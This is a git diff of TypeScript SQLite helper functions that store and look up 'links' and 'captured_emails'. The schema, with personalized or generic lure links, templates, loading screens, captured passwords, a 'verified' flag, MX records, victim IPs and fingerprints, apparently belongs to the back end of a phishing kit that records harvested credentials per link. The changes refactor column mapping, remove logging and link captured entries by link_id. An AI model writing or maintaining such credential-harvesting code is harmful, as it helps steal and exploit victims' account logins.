@@ -81,38 +81,15 @@ function stringifyJSON(value: any): string | null {
 }
 
 // Helper to map DB row to Link object
-// Handles both snake_case (schema) and camelCase (legacy) column names
 function mapRowToLink(row: any): Link {
-  // Map snake_case to camelCase for TypeScript interface
-  const link: any = {
-    id: row.id,
-    type: row.type,
-    sessionIdentifier: row.session_identifier || row.sessionIdentifier,
-    linkToken: row.link_token || row.linkToken || row.session_identifier || row.sessionIdentifier,
-    name: row.name,
-    createdAt: row.created_at || row.createdAt,
-    expiresAt: row.expires_at || row.expiresAt,
-    status: row.status,
-    templateId: row.template_id || row.templateId,
-    templateMode: row.template_mode || row.templateMode,
-    language: row.language,
-    loadingScreen: row.loading_screen || row.loadingScreen,
-    loadingDuration: row.loading_duration || row.loadingDuration,
-    email: row.email,
+  return {
+    ...row,
     used: Boolean(row.used),
-    usedAt: row.used_at || row.usedAt,
-    fingerprint: row.fingerprint,
-    ip: row.ip,
-    allowedEmails: parseJSON(row.allowed_emails || row.allowedEmails),
-    validatedAccounts: parseJSON(row.validated_accounts || row.validatedAccounts),
-    capturedEmails: parseJSON(row.validated_accounts || row.validatedAccounts), // Alias
-    pendingEmails: parseJSON(row.pending_emails || row.pendingEmails),
-    totalEmails: row.total_emails || row.totalEmails,
-    capturedCount: row.captured_count || row.capturedCount,
-    pendingCount: row.pending_count || row.pendingCount,
+    allowedEmails: parseJSON(row.allowedEmails),
+    validatedAccounts: parseJSON(row.validatedAccounts),
+    capturedEmails: parseJSON(row.validatedAccounts), // Alias
+    pendingEmails: parseJSON(row.pendingEmails),
   }
-  
-  return link as Link
 }
 
 // Helper to map DB row to CapturedEmail object
@@ -121,8 +98,11 @@ function mapRowToCapturedEmail(row: any): CapturedEmail {
     ...row,
     passwords: parseJSON(row.passwords) || [],
     verified: Boolean(row.verified),
-    // Handle both snake_case (captured_at) and camelCase (capturedAt) column names
+    // Map snake_case database columns to camelCase TypeScript interface
     capturedAt: row.captured_at || row.capturedAt || Date.now(),
+    mxRecord: row.mx_record || row.mxRecord || 'Not available',
+    sessionIdentifier: row.sessionIdentifier || row.session_identifier,
+    linkToken: row.linkToken || row.link_token,
   }
 }
 
@@ -145,14 +125,6 @@ export async function saveLink(link: Link): Promise<void> {
   } else if (link.linkToken && !link.sessionIdentifier) {
     link.sessionIdentifier = link.linkToken
   }
-  
-  console.log('[LINK DATABASE] 💾 Saving link:', {
-    id: link.id,
-    sessionIdentifier: link.sessionIdentifier?.substring(0, 30) + '...',
-    linkToken: link.linkToken?.substring(0, 30) + '...',
-    status: link.status,
-    email: link.email ? link.email.substring(0, 20) + '...' : null,
-  })
 
   const stmt = db.prepare(`
     INSERT OR REPLACE INTO links (
@@ -182,30 +154,9 @@ export async function saveLink(link: Link): Promise<void> {
  */
 export async function getLink(sessionIdentifier: string): Promise<Link | null> {
   const db = getDb()
-  
-  // Try both snake_case (schema) and camelCase (legacy) column names
-  // SQLite column names are case-insensitive, but we need to match the actual schema
-  let row = db.prepare('SELECT * FROM links WHERE session_identifier = ? OR link_token = ?').get(sessionIdentifier, sessionIdentifier)
-  
-  // If not found with snake_case, try camelCase (for legacy databases)
-  if (!row) {
-    row = db.prepare('SELECT * FROM links WHERE sessionIdentifier = ? OR linkToken = ?').get(sessionIdentifier, sessionIdentifier)
-  }
+  const row = db.prepare('SELECT * FROM links WHERE sessionIdentifier = ? OR linkToken = ?').get(sessionIdentifier, sessionIdentifier)
 
-  if (!row) {
-    console.log('[LINK DATABASE] ⚠️ Token not found:', sessionIdentifier.substring(0, 20) + '...')
-    return null
-  }
-  
-  // Type assertion for row to access properties safely
-  const rowData = row as any
-  console.log('[LINK DATABASE] ✅ Token found:', {
-    id: rowData.id,
-    status: rowData.status,
-    expires_at: rowData.expires_at || rowData.expiresAt,
-    session_identifier: rowData.session_identifier || rowData.sessionIdentifier,
-  })
-  
+  if (!row) return null
   return mapRowToLink(row)
 }
 
@@ -287,34 +238,43 @@ export async function getLinksByType(type: 'personalized' | 'generic'): Promise<
  */
 export async function saveCapturedEmail(captured: CapturedEmail): Promise<void> {
   const db = getDb()
-
-  // Handle hybrid schema (write to both snake_case and camelCase columns to satisfy constraints)
+  // Use snake_case column names to match database schema
+  // Note: sessionIdentifier, linkToken, linkType, linkName are stored in link_id reference
+  // For now, we'll store sessionIdentifier in a JSON field or use link_id if available
   const stmt = db.prepare(`
     INSERT OR REPLACE INTO captured_emails (
-      id, email, sessionIdentifier, linkToken, linkType, linkName,
-      fingerprint, ip, passwords, verified, provider, 
-      capturedAt, captured_at, 
-      attempts, 
-      mxRecord, mx_record,
-      link_id
+      id, email, fingerprint, ip, passwords, verified, provider, 
+      captured_at, attempts, mx_record, link_id
     ) VALUES (
-      ?, ?, ?, ?, ?, ?,
-      ?, ?, ?, ?, ?, 
-      ?, ?, 
-      ?, 
-      ?, ?,
-      ?
+      ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
     )
   `)
 
+  // Get link_id from sessionIdentifier if we have a link
+  let linkId: string | null = null
+  if (captured.sessionIdentifier) {
+    try {
+      const link = await getLink(captured.sessionIdentifier)
+      if (link) {
+        linkId = link.id
+      }
+    } catch {
+      // Link lookup failed, continue without link_id
+    }
+  }
+
   stmt.run(
-    captured.id, captured.email, captured.sessionIdentifier, captured.linkToken, captured.linkType, captured.linkName,
-    captured.fingerprint, captured.ip, stringifyJSON(captured.passwords), captured.verified ? 1 : 0,
-    captured.provider,
-    captured.capturedAt, captured.capturedAt, // Write to both
-    captured.attempts,
-    captured.mxRecord, captured.mxRecord, // Write to both
-    captured.sessionIdentifier // Write to link_id as well
+    captured.id,
+    captured.email,
+    captured.fingerprint,
+    captured.ip,
+    stringifyJSON(captured.passwords),
+    captured.verified ? 1 : 0,
+    captured.provider || 'Unknown',
+    captured.capturedAt || Date.now(),
+    captured.attempts || 0,
+    captured.mxRecord || 'Not available',
+    linkId
   )
 }
 
@@ -347,7 +307,13 @@ export async function getAllCapturedEmails(): Promise<CapturedEmail[]> {
  */
 export async function getCapturedEmailsByLink(sessionIdentifier: string): Promise<CapturedEmail[]> {
   const db = getDb()
-  const rows = db.prepare('SELECT * FROM captured_emails WHERE sessionIdentifier = ? OR linkToken = ?').all(sessionIdentifier, sessionIdentifier)
+  // First, get the link to find its ID
+  const link = await getLink(sessionIdentifier)
+  if (!link) {
+    return []
+  }
+  // Query by link_id (foreign key to links table)
+  const rows = db.prepare('SELECT * FROM captured_emails WHERE link_id = ?').all(link.id)
   return rows.map(mapRowToCapturedEmail)
 }
 
